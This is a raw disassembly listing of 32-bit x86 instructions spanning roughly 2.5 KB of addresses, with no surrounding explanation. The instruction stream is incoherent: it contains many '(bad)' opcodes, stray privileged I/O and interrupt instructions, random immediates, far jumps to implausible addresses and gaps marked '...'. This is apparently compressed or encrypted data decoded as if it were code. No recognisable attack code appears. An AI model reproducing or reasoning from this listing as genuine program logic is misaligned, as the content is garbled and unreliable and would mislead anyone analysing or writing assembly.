  41ab02:	jne    0x41ab6e
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x75000001,al
  41ab0d:	call   0x4ff3:0x5468b50
  41ab14:	push   ds
  41ab15:	dec    eax
  41ab16:	ins    DWORD PTR es:[edi],dx
  41ab17:	mov    bl,0x64
  41ab19:	push   ebp
  41ab1a:	fistp  QWORD PTR [edx]
  41ab1c:	mov    ebp,0xf87b9cab
  41ab21:	or     al,0xa7
  41ab23:	pop    ebx
  41ab24:	and    eax,0x90f5c3f4
  41ab29:	fs mov dl,0x36
  41ab2c:	in     eax,0x85
  41ab2e:	inc    eax
  41ab2f:	cmp    edi,DWORD PTR [esp+edx*8-0x78]
  41ab33:	scas   al,BYTE PTR es:[edi]
  41ab34:	xor    DWORD PTR [edi*4-0x7b615260],esi
  41ab3b:	and    DWORD PTR [edx+0x46c0aebf],ebp
  41ab41:	jno    0x41aad0
  41ab43:	mov    eax,0x4ad15c7c
  41ab48:	aaa    
  41ab49:	dec    edx
  41ab4a:	out    dx,al
  41ab4b:	xor    eax,0x5d130613
  41ab50:	std    
  41ab51:	aad    0xe8
  41ab53:	push   es
  41ab54:	inc    ebp
  41ab55:	adc    BYTE PTR [ecx-0x388d6322],al
  41ab5b:	les    eax,FWORD PTR [ecx-0x61]
  41ab5e:	lods   al,BYTE PTR ds:[esi]
  41ab5f:	adc    DWORD PTR [esi],0xffffffdf
  41ab62:	dec    ecx
  41ab63:	into   
  41ab64:	stc    
  41ab65:	and    DWORD PTR [eax-0x44],esi
  41ab68:	sbb    DWORD PTR [esi],0x29
  41ab6b:	add    DWORD PTR ds:0x764ff324,esi
  41ab71:	mov    ecx,0x4a4d9c84
  41ab76:	pop    ds
  41ab77:	je     0x41abdf
  41ab79:	push   ds
  41ab7a:	js     0x41abdf
  41ab7c:	sti    
  41ab7d:	es inc ebp
  41ab7f:	and    DWORD PTR [edx-0x4aea05d],ecx
  41ab85:	xor    BYTE PTR [eax+0x1],al
  41ab88:	xor    BYTE PTR [ebp+0x1d],dh
  41ab8b:	sti    
  41ab8c:	adc    BYTE PTR [edi-0x3892ec49],ah
  41ab92:	jmp    0x36817075
  41ab97:	in     al,dx
  41ab98:	push   ds
  41ab99:	mov    esp,0xffba42f
  41ab9e:	pop    ebp
  41ab9f:	ficom  WORD PTR [edi-0x77]
  41aba2:	mov    WORD PTR [edi-0x27de9d2],?
  41aba8:	mov    ch,0x57
  41abaa:	inc    ebp
  41abab:	pushf  
  41abac:	imul   edi,DWORD PTR [eax+0x5a589a44],0x48
  41abb3:	les    edi,FWORD PTR [ebx]
  41abb5:	(bad)  
  41abb6:	sti    
  41abb7:	aam    0x50
  41abb9:	and    BYTE PTR ds:0x8ede62ed,cl
  41abbf:	xor    eax,0xcb5b448b
  41abc4:	daa    
  41abc5:	sub    ah,BYTE PTR [esi+0x13]
  41abc8:	jg     0x41ac1a
  41abca:	scas   eax,DWORD PTR es:[edi]
  41abcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abcc:	loopne 0x41ab7a
  41abce:	lahf   
  41abcf:	jb     0x41abd7
  41abd1:	sub    al,0x45
  41abd3:	jg     0x41ac35
  41abd5:	mov    bh,0xdd
  41abd7:	mov    bh,0x1f
  41abd9:	ud1    ecx,ecx
  41abdc:	aaa    
  41abdd:	pushf  
  41abde:	stc    
  41abdf:	shl    bh,1
  41abe1:	add    esi,DWORD PTR [edx]
  41abe3:	push   ebx
  41abe4:	dec    esi
  41abe5:	pushf  
  41abe6:	and    al,0xee
  41abe8:	cld    
  41abe9:	iret   
  41abea:	xchg   esi,eax
  41abeb:	adc    dl,al
  41abed:	fdiv   DWORD PTR [ebx+0x42]
  41abf0:	(bad)  
  41abf1:	stc    
  41abf2:	cmp    DWORD PTR [ebx],ebp
  41abf4:	lods   eax,DWORD PTR ds:[esi]
  41abf5:	addr16 popf 
  41abf7:	loopne 0x41ac77
  41abf9:	or     dh,BYTE PTR [ebx]
  41abfb:	mov    eax,0x218363a3
  41ac00:	pop    edi
  41ac01:	stos   DWORD PTR es:[edi],eax
  41ac02:	stc    
  41ac03:	adc    dl,BYTE PTR [edi]
  41ac05:	iret   
  41ac06:	xchg   ecx,eax
  41ac07:	mov    esp,0x7793fa12
  41ac0c:	mov    al,ds:0xdd883760
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+edx*8+0x55]
  41ac82:	fld    QWORD PTR [esi+0x11c49]
  41ac88:	add    eax,0xc000001
  41ac8d:	hlt    
  41ac8e:	pushf  
  41ac8f:	dec    edi
  41ac90:	pop    ebx
  41ac91:	test   BYTE PTR [ebx-0x49447033],dl
  41ac97:	inc    edx
  41ac98:	fldenv [edi]
  41ac9a:	cdq    
  41ac9b:	dec    esi
  41ac9c:	ins    BYTE PTR es:[edi],dx
  41ac9d:	addr16 xor edx,ebx
  41aca0:	lahf   
  41aca1:	test   eax,0x6ba88d30
  41aca6:	add    esp,DWORD PTR [esp+eiz*4]
  41aca9:	dec    edi
  41acaa:	int    0x84
  41acac:	hlt    
  41acad:	push   eax
  41acae:	test   BYTE PTR [edx+0x3c],0x20
  41acb2:	nop
  41acb3:	and    ebp,eax
  41acb5:	add    edx,DWORD PTR [eax-0x2d]
  41acb8:	mov    bh,0xa
  41acba:	cmovno esi,esp
  41acbd:	jle    0x41ad19
  41acbf:	xchg   edi,eax
  41acc0:	mov    cs,WORD PTR [edx+0x40]
  41acc3:	or     esi,DWORD PTR [edx]
  41acc5:	fbstp  TBYTE PTR [ebp+0x72]
  41acc8:	pop    ecx
  41acc9:	and    ebp,DWORD PTR [eax]
  41accb:	sar    DWORD PTR [esi-0x7c12ab8],cl
  41acd1:	imul   edi,DWORD PTR [ecx],0xffffffb0
  41acd4:	push   esi
  41acd5:	loop   0x41ac80
  41acd7:	pop    ebp
  41acd8:	jmp    0x41acab
  41acda:	xor    eax,0xb496c2ac
  41acdf:	xor    ebx,esi
  41ace1:	dec    ebx
  41ace2:	dec    ecx
  41ace3:	cmc    
  41ace4:	jne    0x41ad30
  41ace6:	dec    ebx
  41ace7:	fnsave [ecx-0x6d]
  41acea:	cmp    BYTE PTR [ecx+edi*1-0xdf5089a],dh
  41acf1:	es push ecx
  41acf3:	mov    ds:0x8f82315d,eax
  41acf8:	shr    DWORD PTR [ecx+0x6bfa79b3],1
  41acfe:	dec    esp
  41acff:	inc    eax
  41ad00:	pop    esi
  41ad01:	fdiv   DWORD PTR [edi]
  41ad03:	(bad)  
  41ad05:	std    
  41ad06:	or     BYTE PTR [esi+ebx*1+0x5abc4dfb],dh
  41ad0d:	xchg   ebx,eax
  41ad0e:	jge    0x41ad8a
  41ad10:	call   0xab059535
  41ad15:	mov    ecx,0x1253091c
  41ad1a:	and    dh,BYTE PTR [ebp-0x1e5348c2]
  41ad20:	inc    esp
  41ad21:	mov    cs,WORD PTR [edx+ebx*2]
  41ad24:	and    DWORD PTR [edi],eax
  41ad26:	stc    
  41ad27:	retf   0x10af
  41ad2a:	lods   eax,DWORD PTR ds:[esi]
  41ad2b:	daa    
  41ad2c:	sahf   
  41ad2d:	stc    
  41ad2e:	mov    edx,0x1a364e67
  41ad33:	push   ds
  41ad34:	mov    al,0x75
  41ad36:	je     0x41acff
  41ad38:	adc    eax,0xb2465e28
  41ad3d:	ror    BYTE PTR [ebp+edi*4+0x44],cl
  41ad41:	xchg   BYTE PTR [ecx],ch
  41ad43:	and    dl,BYTE PTR [ecx-0x3a]
  41ad46:	inc    edx
  41ad47:	sti    
  41ad48:	imul   eax,DWORD PTR gs:[edx-0x2c],0x2a2b5a4d
  41ad50:	sbb    ebx,DWORD PTR ds:0xe5ea3da0
  41ad56:	bound  ebx,QWORD PTR [ecx+ecx*1]
  41ad59:	ja     0x41ada5
  41ad5b:	ja     0x41ad73
  41ad5d:	test   al,cl
  41ad5f:	int    0x22
  41ad61:	fcom   DWORD PTR [esi]
  41ad63:	in     eax,0x0
  41ad65:	sbb    BYTE PTR [edi-0x7d],cl
  41ad68:	or     ecx,DWORD PTR [edx-0x6d]
  41ad6b:	jmp    0xf139:0x84646102
  41ad72:	mov    bh,0x83
  41ad74:	mov    al,0xc1
  41ad76:	mov    bh,0xc8
  41ad78:	mov    ds:0xc327f4e3,al
  41ad7d:	test   DWORD PTR [esi+0x49],esp
  41ad80:	pop    ds
  41ad81:	(bad)  
  41ad82:	xchg   ebp,eax
  41ad83:	in     eax,0xf6
  41ad85:	dec    edx
  41ad86:	mov    dl,0x78
  41ad88:	jae    0x41adf6
  41ad8a:	ja     0x41ad2b
  41ad8c:	dec    esi
  41ad8d:	add    ah,bl
  41ad8f:	xchg   ebp,eax
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebp+eax*4+0x4ee20bb9],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	cwde   
  41ae0d:	cmp    eax,0x9d45b9b3
  41ae12:	pop    es
  41ae13:	mov    ecx,0xf74df012
  41ae18:	leave  
  41ae19:	cmp    DWORD PTR ds:0x1e14c55,ebx
  41ae1f:	or     ecx,ebp
  41ae21:	clc    
  41ae22:	xor    DWORD PTR [ebx-0xf],esi
  41ae25:	mov    ecx,ebx
  41ae27:	scas   eax,DWORD PTR es:[edi]
  41ae28:	mov    ds:0x2fd2e8c3,eax
  41ae2d:	add    bl,bh
  41ae2f:	lods   eax,DWORD PTR ds:[esi]
  41ae30:	push   0x79
  41ae32:	imul   BYTE PTR [ebp+0x5f]
  41ae35:	xor    DWORD PTR [edi+0x1de30180],esp
  41ae3b:	xor    edx,ebx
  41ae3d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41ae3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae40:	xor    eax,0x2401f381
  41ae45:	hlt    
  41ae46:	repnz mov ebp,0xa43b7a3a
  41ae4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4d:	adc    BYTE PTR [edi-0x14b67e7d],dl
  41ae53:	ret    0x1d3c
  41ae56:	xor    eax,0x9f4b26bd
  41ae5b:	aad    0x1e
  41ae5d:	jbe    0x41ae93
  41ae5f:	mov    ds:0x2ef00097,al
  41ae64:	dec    eax
  41ae65:	mov    ch,0x2f
  41ae67:	lea    edx,[esi+0x763801f6]
  41ae6d:	retf   
  41ae6e:	inc    ebx
  41ae6f:	pop    ss
  41ae70:	es mov esp,0xe9ff1165
  41ae76:	jno    0x41aef3
  41ae78:	cmc    
  41ae79:	lea    edi,[ebx]
  41ae7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae7c:	das    
  41ae7d:	dec    ecx
  41ae7e:	rol    ch,1
  41ae80:	aas    
  41ae81:	add    BYTE PTR [edi],bl
  41ae83:	add    al,0x80
  41ae85:	nop    DWORD PTR [eax-0x4e]
  41ae89:	test   al,0xdc
  41ae8b:	test   eax,0xd579b39e
  41ae90:	add    dl,ah
  41ae92:	mov    al,0x36
  41ae94:	mov    ecx,0xc5279391
  41ae99:	shr    DWORD PTR [edx+0x11],1
  41ae9c:	or     DWORD PTR [ebp-0x1311f0b5],eax
  41aea2:	js     0x41ae63
  41aea4:	inc    edi
  41aea5:	mov    DWORD PTR [edx+edi*4+0x5eca1127],edi
  41aeac:	add    eax,0xddc07286
  41aeb1:	pop    ebx
  41aeb2:	pusha  
  41aeb3:	lods   eax,DWORD PTR ds:[esi]
  41aeb4:	push   edi
  41aeb5:	cmp    ebx,esi
  41aeb7:	lahf   
  41aeb8:	into   
  41aeb9:	enter  0x6e70,0xc8
  41aebd:	das    
  41aebe:	mov    eax,ds:0x64b43c75
  41aec3:	and    eax,0xe3495f6f
  41aec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec9:	mov    al,0xe9
  41aecb:	pop    eax
  41aecc:	adc    al,0xaa
  41aece:	jg     0x41af2a
  41aed0:	push   edx
  41aed1:	std    
  41aed2:	sub    DWORD PTR [esp+ecx*4],ecx
  41aed5:	adc    al,0x66
  41aed7:	jmp    0x7f5a3cd2
  41aedc:	je     0x41af3b
  41aede:	inc    edi
  41aedf:	xchg   dl,bl
  41aee1:	(bad)  
  41aee2:	fldenv [ecx-0x30]
  41aee5:	iret   
  41aee6:	out    0xed,eax
  41aee8:	xor    al,BYTE PTR [edx]
  41aeea:	push   es
  41aeeb:	dec    esp
  41aeec:	mov    gs,WORD PTR [edi]
  41aeee:	pop    eax
  41aeef:	mov    dl,0x14
  41aef1:	xchg   edi,eax
  41aef2:	jb     0x41af44
  41aef4:	sbb    BYTE PTR [ebx+0x3e],0x78
  41aef8:	fwait
  41aef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aefa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aefb:	xchg   esp,eax
  41aefc:	daa    
  41aefd:	adc    dh,dl
  41aeff:	dec    ebp
  41af00:	sahf   
  41af01:	mov    ch,0xc1
  41af03:	sbb    eax,0xe7929ac1
  41af08:	pop    eax
  41af09:	arpl   WORD PTR [edi-0x64],cx
  41af0c:	ret    
  41af0d:	lods   eax,DWORD PTR ds:[esi]
  41af0e:	push   edx
  41af0f:	dec    esp
  41af10:	xchg   BYTE PTR [eax],al
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xbc2f44ee
  41af82:	add    eax,0x11e53aa
  41af87:	add    BYTE PTR ds:0xcb000001,al
  41af8d:	nop
  41af8e:	dec    ebx
  41af8f:	pushf  
  41af90:	out    0x34,eax
  41af92:	xchg   esp,eax
  41af93:	das    
  41af94:	sahf   
  41af95:	ret    0xac9f
  41af98:	aas    
  41af99:	push   esi
  41af9a:	ins    BYTE PTR es:[edi],dx
  41af9b:	add    edx,edi
  41af9d:	xor    eax,DWORD PTR [ebp-0x575671c]
  41afa3:	ror    BYTE PTR ds:0x79f16021,cl
  41afa9:	cs dec ebp
  41afab:	jge    0x41af7f
  41afad:	pavgb  mm3,QWORD PTR [edx]
  41afb0:	sub    al,0x49
  41afb2:	lods   al,BYTE PTR ds:[esi]
  41afb3:	lods   eax,DWORD PTR ds:[esi]
  41afb4:	mov    ebp,DWORD PTR [edx+eiz*4-0x399b33e3]
  41afbb:	xchg   edi,eax
  41afbc:	jae    0x41afdf
  41afbe:	mov    edx,0xd2c7778
  41afc3:	push   edi
  41afc4:	aas    
  41afc5:	lds    eax,FWORD PTR [eax-0x1f3da18b]
  41afcb:	iret   
  41afcc:	or     ah,dl
  41afce:	ss daa 
  41afd0:	pop    ebp
  41afd1:	mov    bl,0xad
  41afd3:	icebp  
  41afd4:	xchg   edi,eax
  41afd5:	adc    DWORD PTR [ebp+0x7b],0xffffffcd
  41afd9:	inc    esi
  41afda:	jne    0x41afd3
  41afdc:	adc    DWORD PTR [edi+0x12],0x57e4b720
  41afe3:	ret    0x7fce
  41afe6:	mov    edx,0x29b85491
  41afeb:	ret    
  41afec:	(bad)
  41aff0:	pop    esp
  41aff1:	xchg   BYTE PTR [eax-0x4c],ch
  41aff4:	inc    edx
  41aff5:	cmp    eax,0xd3733749
  41affa:	ins    DWORD PTR es:[edi],dx
  41affb:	hlt    
  41affc:	sub    al,0x35
  41affe:	test   BYTE PTR [ebp+0x5b],bl
  41b001:	jns    0x41b07d
  41b003:	mov    ecx,DWORD PTR ds:0x7b5ef01f
  41b009:	pop    esp
  41b00a:	dec    edi
  41b00b:	add    eax,0x5fa7ae91
  41b010:	lds    ebp,FWORD PTR [esp+ebx*4]
  41b013:	mov    ebx,0xb38abab0
  41b018:	gs xchg ebp,eax
  41b01a:	je     0x41b098
  41b01c:	pop    es
  41b01d:	shr    ecx,cl
  41b01f:	xlat   BYTE PTR ds:[ebx]
  41b020:	mov    dh,0x4
  41b022:	dec    esp
  41b023:	jae    0x41afbb
  41b025:	test   ebx,esi
  41b027:	and    cl,0x50
  41b02a:	mov    ah,0xd6
  41b02c:	div    DWORD PTR [esi+0x14cd512b]
  41b032:	in     al,0x69
  41b034:	xor    eax,0x4eb25878
  41b039:	out    0x40,eax
  41b03b:	gs enter 0x4e5d,0x8e
  41b040:	adc    al,0x27
  41b042:	shr    BYTE PTR [ecx+0x14faea2d],0x79
  41b049:	out    0x25,al
  41b04b:	(bad)  
  41b04c:	fld    DWORD PTR ds:0x4ba45310
  41b052:	jne    0x41b0c5
  41b054:	lock xor eax,0x1a876156
  41b05a:	pop    ebp
  41b05b:	push   eax
  41b05c:	clc    
  41b05d:	pop    esp
  41b05e:	(bad)  
  41b05f:	fst    DWORD PTR [esi]
  41b061:	mov    esp,DWORD PTR [edx+edx*8]
  41b064:	(bad)  
  41b065:	push   cs
  41b066:	sbb    cl,BYTE PTR [ebx+ebp*1]
  41b069:	adc    esi,esi
  41b06b:	sbb    DWORD PTR ds:0xe056b269,ecx
  41b071:	mov    al,0x3b
  41b073:	xor    DWORD PTR [ecx+0x63],0x13a5a3ac
  41b07a:	nop
  41b07b:	or     BYTE PTR [edx+0x7e],0xf9
  41b07f:	sub    edi,DWORD PTR [edx]
  41b081:	push   0x4b
  41b083:	mov    edx,0x5c8aa7fe
  41b088:	iret   
  41b089:	xchg   edx,eax
  41b08a:	mov    ds:0xaaccd7d6,al
  41b08f:	mov    bl,BYTE PTR [ecx]
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x5618f170
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xc8000001
  41b10d:	add    bl,cl
  41b10f:	xchg   esp,eax
  41b110:	cmp    BYTE PTR [eax-0x79e10a4c],bl
  41b116:	scas   al,BYTE PTR es:[edi]
  41b117:	cmp    BYTE PTR [ebx+0x63],dh
  41b11a:	mov    eax,ds:0xc925f249
  41b11f:	dec    ebp
  41b120:	mov    al,ds:0x1de30722
  41b125:	popa   
  41b126:	fisubr WORD PTR [edx-0x9]
  41b129:	mov    ds:0x56c79b3,al
  41b12e:	bnd ret 
  41b130:	adc    eax,0x6944a4b0
  41b135:	pop    es
  41b136:	es sbb al,0x11
  41b139:	mov    ds:0x6bdb2169,al
  41b13e:	imul   ecx,DWORD PTR [esi-0x79],0xffffff80
  41b142:	sub    eax,0x7ec8fea7
  41b147:	jbe    0x41b13b
  41b149:	mov    ds:0x459222d8,eax
  41b14e:	mov    es,ebp
  41b150:	sub    DWORD PTR [edi],esp
  41b152:	(bad)  
  41b153:	lahf   
  41b154:	mov    ds,WORD PTR [ebx-0x35ec5fdb]
  41b15a:	aam    0x37
  41b15c:	cmp    edi,DWORD PTR [edi+0x18934c5b]
  41b162:	push   eax
  41b163:	shl    DWORD PTR [esi+0x281a3549],1
  41b169:	fistp  QWORD PTR [edx]
  41b16b:	jl     0x41b0f2
  41b16d:	fisttp DWORD PTR ds:0x82b043c6
  41b173:	cld    
  41b174:	jle    0x41b162
  41b176:	into   
  41b177:	inc    ebp
  41b178:	stos   DWORD PTR es:[edi],eax
  41b179:	sub    eax,0x9cedd2bd
  41b17e:	test   edi,0x5c1d8395
  41b184:	mov    eax,ds:0x5dc2a735
  41b189:	add    BYTE PTR [esi+0x6dbd18bd],ah
  41b18f:	mov    WORD PTR [esi+0x60100443],?
  41b195:	xlat   BYTE PTR ds:[ebx]
  41b196:	inc    edx
  41b197:	cwde   
  41b198:	jecxz  0x41b16e
  41b19a:	(bad)  
  41b19b:	jp     0x41b1bf
  41b19d:	push   esp
  41b19e:	repz cs jl 0x41b1a2
  41b1a2:	jecxz  0x41b179
  41b1a4:	xchg   DWORD PTR [ebx+0xbb41809],esp
  41b1aa:	sbb    DWORD PTR [esi+0x65ea8fdc],edx
  41b1b0:	fcomp  st(4)
  41b1b2:	das    
  41b1b3:	and    DWORD PTR [ecx+0xd8f333],0x7c
  41b1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1bb:	lods   eax,DWORD PTR ds:[esi]
  41b1bc:	sub    eax,0xa1191ad7
  41b1c1:	daa    
  41b1c2:	data16 fld st(6)
  41b1c5:	mov    eax,0x7de863e1
  41b1ca:	out    0x10,al
  41b1cc:	mov    ds:0xd793d5d4,al
  41b1d1:	add    ch,BYTE PTR [ebp+0x36df252d]
  41b1d7:	data16 and al,0xf4
  41b1da:	je     0x41b167
  41b1dc:	scas   eax,DWORD PTR es:[edi]
  41b1dd:	dec    BYTE PTR [edi+eiz*2-0x3c]
  41b1e1:	lock inc ecx
  41b1e3:	or     BYTE PTR [ecx+0x3e],bl
  41b1e6:	dec    ebp
  41b1e7:	xor    BYTE PTR [ecx],dh
  41b1e9:	shr    BYTE PTR [ebp-0x67f9c6d9],1
  41b1ef:	aad    0x8f
  41b1f1:	jnp    0x41b214
  41b1f3:	jnp    0x41b1da
  41b1f5:	loopne 0x41b1d3
  41b1f7:	(bad)  
  41b1f8:	ins    BYTE PTR es:[edi],dx
  41b1f9:	xchg   edi,eax
  41b1fa:	in     eax,0x5f
  41b1fc:	(bad)  
  41b1fd:	pop    edi
  41b1fe:	or     BYTE PTR [edi+0x26],cl
  41b201:	cmp    esi,DWORD PTR [edi+eiz*4-0x50376ade]
  41b208:	cmp    al,0x39
  41b20a:	adc    eax,0x6afdfd20
  41b20f:	xor    DWORD PTR ds:0x0,0x0
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [esi],ah
  41b281:	xor    eax,0x205d2f30
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    eax,0xd8000001
  41b28d:	lods   eax,DWORD PTR ds:[esi]
  41b28e:	mov    ds:0xfba95aac,al
  41b293:	inc    eax
  41b294:	pop    edx
  41b295:	pop    ebx
  41b296:	and    al,0x95
  41b298:	cmp    eax,0x1a2dd818
  41b29d:	fld    DWORD PTR [esi]
  41b29f:	add    al,0x1f
  41b2a1:	cmp    ecx,ebx
  41b2a3:	int3   
  41b2a4:	aam    0x28
  41b2a6:	aaa    
  41b2a7:	icebp  
  41b2a8:	(bad)  
  41b2aa:	dec    ebp
  41b2ab:	and    ebx,DWORD PTR [edx-0x701d1d03]
  41b2b1:	shr    BYTE PTR [esi+0x746a56a6],cl
  41b2b7:	adc    ah,BYTE PTR [esi+edx*2]
  41b2ba:	repz (bad) 
  41b2bc:	iret   
  41b2bd:	into   
  41b2be:	imul   esp,esi,0xffffffa8
  41b2c1:	pop    eax
  41b2c2:	cli    
  41b2c3:	test   al,0x8e
  41b2c5:	cmp    BYTE PTR ds:0x7a18e756,bh
  41b2cb:	out    dx,al
  41b2cc:	fisub  DWORD PTR [ebx]
  41b2ce:	test   eax,0x8f5c94a0
  41b2d3:	lods   al,BYTE PTR ds:[esi]
  41b2d4:	xor    al,BYTE PTR [ecx]
  41b2d6:	bound  ebp,QWORD PTR [ebx]
  41b2d8:	stos   BYTE PTR es:[edi],al
  41b2d9:	add    DWORD PTR [edx+eiz*8+0xb],0x89a302f2
  41b2e1:	sub    al,0x1b
  41b2e3:	add    dl,ah
  41b2e5:	push   esi
  41b2e6:	int3   
  41b2e7:	xor    ebx,DWORD PTR [edx]
  41b2e9:	pop    esp
  41b2ea:	mov    BYTE PTR [ebx+0x624260d1],dl
  41b2f0:	aad    0xd4
  41b2f2:	loopne 0x41b2bd
  41b2f4:	lock add al,dh
  41b2f7:	push   ebp
  41b2f8:	mov    BYTE PTR [edi-0x10],ch
  41b2fb:	inc    edx
  41b2fc:	xor    ch,dh
  41b2fe:	dec    esp
  41b2ff:	add    BYTE PTR [ecx-0x4a],ah
  41b302:	mov    ebx,0x587ac7d1
  41b307:	xor    eax,0x5bad73ef
  41b30c:	add    ebx,esp
  41b30e:	repnz (bad) 
  41b310:	xor    ecx,DWORD PTR [esi+0x4b17f5c1]
  41b316:	cmp    BYTE PTR [ebx],dh
  41b318:	lds    eax,FWORD PTR [edi]
  41b31a:	or     BYTE PTR [edi-0x48],bl
  41b31d:	cmc    
  41b31e:	inc    ebx
  41b31f:	lock es inc ebp
  41b322:	and    eax,0x499b771c
  41b327:	in     eax,0xb5
  41b329:	xor    esp,DWORD PTR [ebx+0x36]
  41b32c:	or     esi,DWORD PTR [edx]
  41b32e:	xor    ecx,0x7d000112
  41b334:	inc    esp
  41b335:	pop    esi
  41b336:	sbb    al,0x18
  41b338:	mov    ecx,DWORD PTR [esp+ecx*1-0x74]
  41b33c:	adc    DWORD PTR [ebp+eiz*4-0x62a76d04],0x23
  41b344:	mov    bh,0xe
  41b346:	(bad)  
  41b347:	add    ebp,DWORD PTR [eax-0x2cfe0a5e]
  41b34d:	sub    eax,0xc3cc43e9
  41b352:	push   eax
  41b353:	xchg   esi,eax
  41b354:	fcom   DWORD PTR [ecx+0x7b]
  41b357:	sbb    ebx,DWORD PTR [ecx+0x1c]
  41b35a:	mov    ebx,0x77b08701
  41b35f:	ins    BYTE PTR es:[edi],dx
  41b360:	xor    ah,BYTE PTR [esi-0x634e8149]
  41b366:	scas   al,BYTE PTR es:[edi]
  41b367:	or     al,0xbb
  41b369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36a:	pop    ecx
  41b36b:	mov    al,0x45
  41b36d:	retf   
  41b36e:	sub    ebx,DWORD PTR [esi-0x3f]
  41b371:	inc    ecx
  41b372:	nop
  41b373:	das    
  41b374:	or     ebp,esi
  41b376:	sbb    al,0x14
  41b378:	out    0x76,eax
  41b37a:	mov    ebx,0x6d7d5fb1
  41b37f:	xchg   ebx,eax
  41b380:	adc    DWORD PTR [esi],0xfffffff3
  41b383:	sahf   
  41b384:	xchg   esi,eax
  41b385:	push   0x68c2f73c
  41b38a:	sar    BYTE PTR [esi-0x6d],cl
  41b38d:	mov    esp,0x8a60d1
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	xchg   ecx,eax
  41b401:	mov    ebx,0x21624b4d
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0x72000001
  41b40d:	call   0xa6f9118
  41b412:	outs   dx,DWORD PTR ds:[esi]
  41b413:	sbb    dh,bl
  41b415:	sub    DWORD PTR ds:[edi+0x22],edi
  41b419:	and    DWORD PTR [esi-0xb],0xb6115a50
  41b420:	ss jmp 0x41b3ff
  41b423:	in     al,0x91
  41b425:	inc    eax
  41b426:	add    DWORD PTR [edi-0x68],ebx
  41b429:	lahf   
  41b42a:	xchg   ecx,eax
  41b42b:	lods   eax,DWORD PTR ds:[esi]
  41b42c:	sub    ebp,DWORD PTR [edx+0x6a]
  41b42f:	retf   0x662c
  41b432:	ins    BYTE PTR es:[edi],dx
  41b433:	mov    ss,WORD PTR [eax-0x71291312]
  41b439:	and    ebx,DWORD PTR [ebx]
  41b43b:	out    dx,al
  41b43c:	gs dec ebp
  41b43e:	inc    eax
  41b43f:	cwde   
  41b440:	cmc    
  41b441:	jle    0x41b436
  41b443:	fsubr  st(6),st
  41b445:	xchg   ebp,eax
  41b446:	test   DWORD PTR [esp+eax*2],ebx
  41b449:	jl     0x41b426
  41b44b:	nop
  41b44c:	sti    
  41b44d:	in     eax,dx
  41b44e:	inc    edi
  41b44f:	pop    ebp
  41b450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b451:	mov    ebx,0x2963d32f
  41b456:	fs pop esi
  41b458:	inc    esi
  41b459:	ror    BYTE PTR [ecx-0x3ed160aa],1
  41b45f:	sub    eax,0x1ffbf022
  41b464:	pushf  
  41b465:	cmp    edi,edx
  41b467:	std    
  41b468:	xlat   BYTE PTR ds:[ebx]
  41b469:	in     eax,0x21
  41b46b:	xchg   esi,eax
  41b46c:	sbb    al,0x7f
  41b46e:	das    
  41b46f:	dec    edx
  41b470:	imul   ebp,ecx,0x39c21a67
  41b476:	jle    0x41b416
  41b478:	outs   dx,BYTE PTR ds:[esi]
  41b479:	icebp  
  41b47a:	std    
  41b47b:	in     al,dx
  41b47c:	std    
  41b47d:	clc    
  41b47e:	and    BYTE PTR [edx-0x5202e2f8],dh
  41b484:	popa   
  41b485:	popf   
  41b486:	cmp    al,0xce
  41b488:	dec    eax
  41b489:	pop    edx
  41b48a:	repz cmp DWORD PTR [ebx+0x51],edi
  41b48e:	jecxz  0x41b4f7
  41b490:	xchg   edi,eax
  41b491:	cs ja  0x41b44c
  41b494:	imul   edi,DWORD PTR [ebx+0x39],0xefa966e3
  41b49b:	cmc    
  41b49c:	dec    esp
  41b49d:	mov    eax,0x9132d46
  41b4a2:	pop    esp
  41b4a3:	stos   BYTE PTR es:[edi],al
  41b4a4:	cmp    dl,ch
